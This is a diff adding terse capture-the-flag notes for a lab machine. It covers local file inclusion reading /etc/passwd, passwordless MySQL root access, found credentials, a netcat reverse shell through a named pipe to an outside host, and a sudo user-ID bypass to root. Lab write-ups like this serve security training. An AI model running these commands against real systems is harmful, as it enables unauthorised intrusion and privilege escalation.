@@ -1,0 +1,151 @@
+
+
+robots.txt ---> nandi.php
+
+
+http://192.168.179.130/nandi.php?file=/etc/passwd
+
+
+www-data@ubuntu:/home$ mysql -u root
+mysql -u root
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 7
+Server version: 5.7.27-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mahadev            |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.01 sec)
+
+mysql> use mahadev;
+use mahadev;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
+show tables;
++-------------------+
+| Tables_in_mahadev |
++-------------------+
+| hint              |
++-------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from hint;
+select * from hint;
++---------------------------+
+| hint                      |
++---------------------------+
+| check on media filesystem |
++---------------------------+
+1 row in set (0.00 sec)
+
+
+
+www-data@ubuntu:/home$ cd /media
+cd /media
+www-data@ubuntu:/media$ ls
+ls
+cdrom  creds  floppy  floppy0  hints
+www-data@ubuntu:/media$ cd hints
+cd hints
+bash: cd: hints: Not a directory
+www-data@ubuntu:/media$ cat hints
+cat hints
+https://www.hackingarticles.in/cloakify-factory-a-data-exfiltration-tool-uses-text-based-steganography/   
+
+without noise
+www-data@ubuntu:/media$ 
+
+
+
+mahakaal:kalbhairav
+
+
+mahakaal@ubuntu:~$ mknod /tmp/backpipe p 
+mahakaal@ubuntu:~$ /bin/sh 0</tmp/backpipe | nc 192.168.179.1 1234 1>/tmp/backpipe
+^C
+mahakaal@ubuntu:~$ 
+
+mahakaal@ubuntu:~$ sudo -u#-1 watch -x sh -c 'reset; exec sh 1>&0 2>&0' -u
+# 
+# id
+uid=0(root) gid=1001(mahakaal) groups=1001(mahakaal)
+# ls
+# ls -la
+total 28
+drwxr-xr-x 3 mahakaal mahakaal 4096 Jan 10 15:26 .
+drwxr-xr-x 5 root     root     4096 Oct 21 07:59 ..
+-rw------- 1 root     mahakaal   12 Oct 21 07:56 .bash_history
+-rw-r--r-- 1 mahakaal mahakaal  220 Oct 21 07:54 .bash_logout
+-rw-r--r-- 1 mahakaal mahakaal 3771 Oct 21 07:54 .bashrc
+drwx------ 2 mahakaal mahakaal 4096 Oct 21 07:55 .cache
+-rw-r--r-- 1 mahakaal mahakaal  807 Oct 21 07:54 .profile
+# cd /root
+# ls
+final.txt
+# cat final.txt	
+
+
+     .           ]@&L           .
+      Jw         #@&&         zM
+      '|$w      ,]@&$L      ,$\r
+       k|$L     ]]@$$$     ,@|j
+       ]@!$     j]@&$$W    $|p[
+        @@j$   ]j]N&$$@   $@@@
+        $&@B~  jj]B&$$@   @@$@
+        #R&&[  `]]@&$$*  ]$$@N
+        j%%@$    "@&M    ]RN%k
+        |" 7$     $&     ]F%"|
+        (%'"$      $     $@%") 
+         \%%$     *g@*   $%"/
+            ''*]%r&& %h*'''
+                'L@&=r
+                 '@&U
+                 j@&L
+                 ]@&[
+                 $@&K
+                 $@&@
+                 $$$@
+       j@Hw.    -&&&&L    ,=m$~
+       j@%%kkHr.       <[kkj]%r
+       j@@gjjji||!;;!||jjjj%]%r
+       j@Hkkj|||!=||~!l|jjjk%%r
+       j@%%kisj|;!!*!;|!{{jj]%r
+       j@@pkjb*` !#$#! `*jjkk]%r
+       j[M"`     '&7!'     `*%$r
+                 !%%!;
+                 ;||!;
+                 ;||!: 
+
+!! Congrats you have finished this task !!		
+							
+Contact us here:						
+								
+Hacking Articles : https://twitter.com/rajchandel/
+Aarti Singh: https://www.linkedin.com/in/aarti-singh-353698114/		
+								
+								
++-+-+-+-+-+ +-+-+-+-+-+-+-+					
+ |E|n|j|o|y| |H|A|C|K|I|N|G|			
+ +-+-+-+-+-+ +-+-+-+-+-+-+-+						
+____________________________________
+# 
+
